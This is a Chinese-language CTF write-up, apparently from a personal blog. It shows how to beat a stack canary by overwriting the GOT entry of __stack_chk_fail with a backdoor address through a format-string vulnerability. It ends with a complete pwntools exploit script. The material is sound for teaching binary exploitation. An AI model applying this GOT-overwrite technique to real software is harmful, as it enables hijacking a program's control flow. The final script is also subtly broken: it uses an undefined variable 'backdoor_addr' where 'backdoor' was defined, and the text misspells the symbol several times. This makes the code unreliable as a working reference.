---
title: "Canary绕过专题(5)——劫持__stack_chk_fail"
published: 2025-12-01
description: "劫持stackchkfail函数 原理 遇到canary错误时，会执行以下函数： 劫持stackchkfaik函数的got表为目标函数即可 例题分析 检查安全机制 没有 Full RELRO ，修改GOT表的思路可行 再看IDA 能溢出12"
image: "../Canary.png"
tags: [CTF, Pwn]
category: CTF
draft: false
slug: canary-bypass-5-hijack-stack-chk-fail
---# 劫持__stack_chk_fail函数

### 原理

遇到canary错误时，会执行以下函数：

```c
#include <stdio.h>

void
__attribute__ ((noreturn))
__stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
```

劫持__stack_chk_faik函数的**got表**为**目标函数**即可

---

### 例题分析

检查安全机制

![image.png](./image-01.png)

没有 `Full RELRO` ，**修改GOT表**的思路可行

再看IDA

![image.png](./image-02.png)

能溢出**128字节**，这个题应该是可以用**覆盖截断字符**的方法的

但这里我们还是用劫持 `_`的方法

关键点在于 `printf(buf)`

我们可以用它找到输入的 `buf` 是 `printf` 的第几个参数，这样就找到了写入点

再用**pwntools自带的** `fmtstr_payload` 函数，自动生成修改地址的格式化字符串

我们就能把__stack_chk_faik的got表改为backdoor地址

输入 `AAAA`测试一下

![image.png](./image-03.png)

用 `fmtarg`指令计算偏移

![image.png](./image-04.png)

这样就得到了**offset = 6**

这里我们还需要判断一下自动生成的格式化字符串链**能否覆盖到Canary**，不够的话就需要我们补齐

```python
length = len(payload)
if length < 72:
    payload += b'A' * (72 - length + 8)
else:
    payload += b'A' * 16 
```

最后exp：

```python
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
#p = process('./canary5')
p = remote('ip',port)
elf = ELF('./canary5')

backdoor = elf.symbols['backdoor'] 
got_chk_fail = elf.got['__stack_chk_fail']

offset = 6

payload = fmtstr_payload(offset, {got_chk_fail: backdoor_addr})
length = len(payload)
if length < 72:
    payload += b'A' * (72 - length + 8)
else:
    payload += b'A' * 16 

p.recvuntil(b"Tell me your story:\n")
p.send(payload)

p.interactive()

```
